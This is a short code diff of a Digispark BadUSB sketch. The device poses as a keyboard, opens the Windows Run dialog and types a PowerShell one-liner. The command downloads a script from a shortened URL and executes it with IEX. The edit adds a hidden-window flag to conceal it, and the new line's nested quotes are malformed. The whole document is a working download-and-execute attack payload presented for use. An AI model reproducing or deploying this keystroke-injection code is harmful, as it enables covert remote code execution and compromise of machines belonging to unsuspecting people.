@@ -10,7 +10,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://tinyurl.com/4y9e8yhf');\"");
+  DigiKeyboard.print("powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://tinyurl.com/4y9e8yhf')"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for (;;) {
     /*Stops the digispark from running the scipt again*/
